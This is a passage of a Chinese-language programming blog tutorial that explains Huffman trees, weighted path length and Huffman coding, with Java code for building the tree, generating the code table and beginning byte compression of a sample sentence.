        <content type="html"><![CDATA[<h1 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>在一棵树中，从一个结点往下可以达到的孩子或孙子结点之间的通路，称为<strong>路径</strong>。通路中分支的数目称为<strong>路径长度</strong>。若规定根结点的层数为1，则从根结点到第L层结点的路径长度为L-1。</p><p><strong>树的路径长度就是从树根到每一结点的路径长度之和。</strong></p><p>若将树中结点赋予一个有着某种含义的数值，则这个数值称为该<strong>结点的权</strong>。<strong>结点的带权路径长度</strong>为：从根结点到该结点之间的路径长度与该结点的权的乘积。</p><p><strong>树的带权路径长度规定为所有叶子结点的带权路径长度之和，记为WPL(weighted path length) ,权值越大的结点离根结点越近的二叉树才是最优二叉树。WPL最小的就是赫夫曼树，也称为哈夫曼树(Huffman Tree), 还有的书翻译为霍夫曼树。</strong></p><h2 id="哈夫曼树的创建"><a href="#哈夫曼树的创建" class="headerlink" title="哈夫曼树的创建"></a>哈夫曼树的创建</h2><p><strong>思路分析：</strong></p><blockquote><ol><li>每个数据都是一个节点 ，从小到大进行排序,  每个节点可以看成是一颗最简单的二叉树。</li><li>取出节点权值最小的两颗二叉树 。组成一颗新的二叉树, 该新的二叉树的根节点的权值是前面两颗二叉树根节点权值的和 。</li><li>再将这颗新的二叉树，以根节点的权值大小再次排序， 不断重复2-3的步骤，直到数列中，所有的数据都被处理，只剩下一个节点时就得到一颗赫夫曼树。</li></ol></blockquote><p><strong>代码实现：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.huffmantree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HuffmanTree</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">1</span> &#125;;</span><br><span class="line"><span class="type">Node</span> <span class="variable">root</span> <span class="operator">=</span> createHuffmanTree(arr);</span><br><span class="line">preOrder(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">root.preOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;根节点为空，不能遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">createHuffmanTree</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">List&lt;Node&gt; nodes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Node&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> value : arr) &#123;</span><br><span class="line">nodes.add(<span class="keyword">new</span> <span class="title class_">Node</span>(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (nodes.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">Collections.sort(nodes);</span><br><span class="line"></span><br><span class="line"><span class="type">Node</span> <span class="variable">leftNode</span> <span class="operator">=</span> nodes.get(<span class="number">0</span>);</span><br><span class="line"><span class="type">Node</span> <span class="variable">righNode</span> <span class="operator">=</span> nodes.get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Node</span> <span class="variable">parentNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(leftNode.value + righNode.value);</span><br><span class="line">parentNode.left = leftNode;</span><br><span class="line">parentNode.right = righNode;</span><br><span class="line"></span><br><span class="line">nodes.remove(leftNode);</span><br><span class="line">nodes.remove(righNode);</span><br><span class="line">nodes.add(parentNode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nodes.get(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;Node&gt; &#123;</span><br><span class="line"><span class="type">int</span> value;</span><br><span class="line">Node left;</span><br><span class="line">Node right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.value = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.preOrder();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.preOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Node [value=&quot;</span> + value + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Node o)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.value - o.value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h2><p><strong>基本介绍：</strong></p><blockquote><ul><li>哈夫曼编码(Huffman Coding)，又称霍夫曼编码，是一种编码方式, 属于一种程序算法。</li><li>哈夫曼编码是哈夫曼树在电讯通信中的经典的应用之一。</li><li>哈夫曼编码广泛地用于数据文件压缩。其压缩率通常在20%～90%之间。</li><li>哈夫曼编码是可变字长编码(VLC)的一种。Huffman于1952年提出一种编码方法，称之为最佳编码。</li></ul></blockquote><p><strong>原理剖析：</strong>在线转码工具 (<a href="https://www.mokuge.com/tool/asciito16/">https://www.mokuge.com/tool/asciito16/</a> )</p><hr><p>通信领域中信息的处理方式1-<strong>定长编码</strong></p><p>i like like like java do you like a java       &#x2F;&#x2F; 共40个字符(包括空格)  </p><p>105 32 108 105 107 101 32 108 105 107 101 32 108 105 107 101 32 106 97 118 97 32 100 111 32 121 111 117 32 108 105 107 101 32 97 32 106 97 118 97  &#x2F;&#x2F;对应Ascii码</p><p>01101001 00100000 01101100 01101001 01101011 01100101 00100000 01101100 01101001 01101011 01100101 00100000 01101100 01101001 01101011 01100101 00100000 01101010 01100001 01110110 01100001 00100000 01100100 01101111 00100000 01111001 01101111 01110101 00100000 01101100 01101001 01101011 01100101 00100000 01100001 00100000 01101010 01100001 01110110 01100001 </p><p>&#x2F;&#x2F;对应的二进制</p><p>按照二进制来传递信息，总的长度是  359   (包括空格)</p><hr><p>通信领域中信息的处理方式2-<strong>变长编码</strong></p><p>i like like like java do you like a java       &#x2F;&#x2F; 共40个字符(包括空格)</p><p>d:1 y:1 u:1 j:2  v:2  o:2  l:4  k:4  e:4 i:5  a:5   :9  &#x2F;&#x2F; 各个字符对应的个数</p><p>0&#x3D;  ,  1&#x3D;a, 10&#x3D;i, 11&#x3D;e, 100&#x3D;k, 101&#x3D;l, 110&#x3D;o, 111&#x3D;v, 1000&#x3D;j, 1001&#x3D;u, 1010&#x3D;y, 1011&#x3D;d     &#x2F;&#x2F; 说明：按照各个字符出现的次数进行编码，原则是出现次数越多的，则编码越小，比如空格出现了9 次，编码为0 ,其它依次类推</p><p>按照上面给各个字符规定的编码，则我们在传输  “i like like like java do you like a java” 数据时，编码就是 10010110100…  </p><hr><p>通信领域中信息的处理方式3-<strong>赫夫曼编码</strong></p><p>i like like like java do you like a java       &#x2F;&#x2F; 共40个字符(包括空格)</p><p>d:1 y:1 u:1 j:2  v:2  o:2  l:4  k:4  e:4 i:5  a:5   :9  &#x2F;&#x2F; 各个字符对应的个数</p><p>按照上面字符出现的次数构建一颗赫夫曼树, 次数作为权值</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214943.png"></p><blockquote><p>&#x2F;&#x2F;根据赫夫曼树，给各个字符规定编码 ， 向左的路径为0,向右的路径为1 ， 编码如下:</p><p>o : 1000   u : 10010  d : 100110   y : 100111   i : 101<br>a : 110      k : 1110    e : 1111        j : 0000       v : 0001<br>l : 001         : 01</p><p>按照上面的赫夫曼编码，我们的”i like like like java do you like a java”   字符串对应的编码为 (注意这里我们使用的无损压缩)</p><p>1010100110111101111010011011110111101001101111011110100001100001110011001111000011001111000100100100110111101111011100100001100001110</p><p>长度为 ： 133<br>说明:<br>原来长度是  359 , 压缩了  (359-133) &#x2F; 359 &#x3D; 62.9%<br>此编码满足<strong>前缀编码</strong>, 即字符的编码都不能是其他字符编码的前缀。不会造成匹配的多义性,变长编码有多义性</p><p>注意, 这个赫夫曼树根据权值的排序方法不同，也可能不太一样，相同权值的字符顺序不同，这样对应的赫夫曼编码也不完全一样，但是wpl 是一样的，都是最小的。</p></blockquote><h2 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h2><h3 id="创建哈夫曼树"><a href="#创建哈夫曼树" class="headerlink" title="创建哈夫曼树"></a>创建哈夫曼树</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.huffmancode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HuffmanCode</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;i like like like java do you like a java&quot;</span>;</span><br><span class="line"><span class="type">byte</span>[] contentBytes = content.getBytes();<span class="comment">//会将字符转为Ascii码存储</span></span><br><span class="line">System.out.println(contentBytes.length);</span><br><span class="line"></span><br><span class="line">List&lt;Node&gt; nodes = getNodes(contentBytes);</span><br><span class="line"><span class="type">Node</span> <span class="variable">huffmanTreeRoot</span> <span class="operator">=</span> createHuffmanTree(nodes);</span><br><span class="line">preOrder(huffmanTreeRoot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(Node root)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">root.preOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;根节点为空，不能遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Node&gt; <span class="title function_">getNodes</span><span class="params">(<span class="type">byte</span>[] contentBytes)</span> &#123;</span><br><span class="line">List&lt;Node&gt; nodes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Node&gt;();</span><br><span class="line">Map&lt;Byte, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Byte, Integer&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">byte</span> b : contentBytes) &#123;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> map.get(b);</span><br><span class="line"><span class="keyword">if</span> (count == <span class="literal">null</span>) &#123;</span><br><span class="line">map.put(b, <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">map.put(b, count + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Byte, Integer&gt; e : map.entrySet()) &#123;</span><br><span class="line">nodes.add(<span class="keyword">new</span> <span class="title class_">Node</span>(e.getKey(), e.getValue()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> nodes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">createHuffmanTree</span><span class="params">(List&lt;Node&gt; nodes)</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (nodes.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">Collections.sort(nodes);</span><br><span class="line"></span><br><span class="line"><span class="type">Node</span> <span class="variable">leftNode</span> <span class="operator">=</span> nodes.get(<span class="number">0</span>);</span><br><span class="line"><span class="type">Node</span> <span class="variable">righNode</span> <span class="operator">=</span> nodes.get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Node</span> <span class="variable">pareNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="literal">null</span>, leftNode.weight + righNode.weight);</span><br><span class="line">pareNode.left = leftNode;</span><br><span class="line">pareNode.right = righNode;</span><br><span class="line"></span><br><span class="line">nodes.remove(leftNode);</span><br><span class="line">nodes.remove(righNode);</span><br><span class="line">nodes.add(pareNode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nodes.get(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;Node&gt; &#123;</span><br><span class="line">Byte data;</span><br><span class="line"><span class="type">int</span> weight;</span><br><span class="line">Node left;</span><br><span class="line">Node right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(Byte data, <span class="type">int</span> weight)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.data = data;</span><br><span class="line"><span class="built_in">this</span>.weight = weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.preOrder();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.preOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Node [data=&quot;</span> + data + <span class="string">&quot;, weight=&quot;</span> + weight + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Node o)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.weight - o.weight;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>40<br>Node [data&#x3D;null, weight&#x3D;40]<br>Node [data&#x3D;null, weight&#x3D;17]<br>Node [data&#x3D;null, weight&#x3D;8]<br>Node [data&#x3D;108, weight&#x3D;4]<br>Node [data&#x3D;null, weight&#x3D;4]<br>Node [data&#x3D;106, weight&#x3D;2]<br>Node [data&#x3D;111, weight&#x3D;2]<br>Node [data&#x3D;32, weight&#x3D;9]<br>Node [data&#x3D;null, weight&#x3D;23]<br>Node [data&#x3D;null, weight&#x3D;10]<br>Node [data&#x3D;97, weight&#x3D;5]<br>Node [data&#x3D;105, weight&#x3D;5]<br>Node [data&#x3D;null, weight&#x3D;13]<br>Node [data&#x3D;null, weight&#x3D;5]<br>Node [data&#x3D;null, weight&#x3D;2]<br>Node [data&#x3D;100, weight&#x3D;1]<br>Node [data&#x3D;117, weight&#x3D;1]<br>Node [data&#x3D;null, weight&#x3D;3]<br>Node [data&#x3D;121, weight&#x3D;1]<br>Node [data&#x3D;118, weight&#x3D;2]<br>Node [data&#x3D;null, weight&#x3D;8]<br>Node [data&#x3D;101, weight&#x3D;4]<br>Node [data&#x3D;107, weight&#x3D;4]</p><h3 id="生成哈夫曼编码表"><a href="#生成哈夫曼编码表" class="headerlink" title="生成哈夫曼编码表"></a>生成哈夫曼编码表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成赫夫曼树对应的赫夫曼编码</span></span><br><span class="line"><span class="comment">// 思路:</span></span><br><span class="line"><span class="comment">// 1. 将赫夫曼编码表存放在 Map&lt;Byte,String&gt; 形式</span></span><br><span class="line"><span class="comment">// 生成的赫夫曼编码表&#123;32=01, 97=100, 100=11000, 117=11001...&#125;</span></span><br><span class="line"><span class="keyword">static</span> Map&lt;Byte, String&gt; huffmanCodes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Byte, String&gt;();</span><br><span class="line"><span class="comment">// 2. 在生成赫夫曼编码表时，需要去拼接路径, 定义一个StringBuilder存储某个叶子结点的路径</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 功能：将传入的node结点的所有叶子结点的赫夫曼编码得到，并放入到huffmanCodes集合</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> node          传入结点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> code          路径： 左子结点是 0, 右子结点 1</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stringBuilder 用于拼接路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getCodes</span><span class="params">(Node node, String code, StringBuilder stringBuilder)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringBuilder2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(stringBuilder);</span><br><span class="line">stringBuilder2.append(code);</span><br><span class="line"><span class="keyword">if</span> (node.data == <span class="literal">null</span>) &#123;</span><br><span class="line">getCodes(node.left, <span class="string">&quot;0&quot;</span>, stringBuilder2);</span><br><span class="line">getCodes(node.right, <span class="string">&quot;1&quot;</span>, stringBuilder2);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">huffmanCodes.put(node.data, stringBuilder2.toString());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了调用方便，我们重载 getCodes</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;Byte, String&gt; <span class="title function_">getCodes</span><span class="params">(Node root)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">getCodes(root, <span class="string">&quot;&quot;</span>, stringBuilder);</span><br><span class="line"><span class="keyword">return</span> huffmanCodes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>{32&#x3D;01, 97&#x3D;100, 100&#x3D;11000, 117&#x3D;11001, 101&#x3D;1110, 118&#x3D;11011, 105&#x3D;101, 121&#x3D;11010, 106&#x3D;0010, 107&#x3D;1111, 108&#x3D;000, 111&#x3D;0011}</p><h3 id="压缩成哈夫曼字节数组"><a href="#压缩成哈夫曼字节数组" class="headerlink" title="压缩成哈夫曼字节数组"></a>压缩成哈夫曼字节数组</h3><ul><li><p>String content &#x3D; “i like like like java do you like a java”; 原文</p></li><li><p>byte[] contentBytes &#x3D; content.getBytes();  会将原文字符转为Ascii码存储</p></li><li><p>1010100010111111110010001011111111001000101111111100100101001101110001110000011011101000111100101000101111111100110001001010011011100  将Ascii码用哈夫曼编码表转换</p><ul><li>byte[] huffmanCodeBytes  ，即 8位对应一个 byte放入到 huffmanCodeBytes<ul><li>计算机中二进制都是以补码的形式表示的。</li><li>huffmanCodeBytes[0] &#x3D;  10101000(补码) &#x3D;&gt; [推导  10101000&#x3D;&gt; 10101000 - 1 &#x3D;&gt; 10100111(反码)&#x3D;&gt; 11011000(原码)&#x3D; -88 ]</li><li>huffmanCodeBytes[0] &#x3D; -88</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] zip(<span class="type">byte</span>[] bytes, Map&lt;Byte, String&gt; huffmanCodes) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.利用 huffmanCodes哈夫曼编码表 将 contentBytes 转成 赫夫曼编码对应的字符串</span></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">stringBuilder.append(huffmanCodes.get(b));</span><br><span class="line">&#125;</span><br><span class="line">huffmanStr = stringBuilder;</span><br><span class="line">       </span><br><span class="line"><span class="comment">//2.将赫夫曼编码对应的字符串每8位（补码）进行压缩（十进制数）</span></span><br><span class="line"><span class="type">int</span> <span class="variable">lenth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 一句话 int len = (stringBuilder.length() + 7) / 8;</span></span><br><span class="line"><span class="keyword">if</span> (stringBuilder.length() % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">lenth = stringBuilder.length() / <span class="number">8</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">lenth = stringBuilder.length() / <span class="number">8</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">byte</span>[] huffmanCodeBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[lenth];</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; stringBuilder.length(); i = i + <span class="number">8</span>) &#123;</span><br><span class="line">String 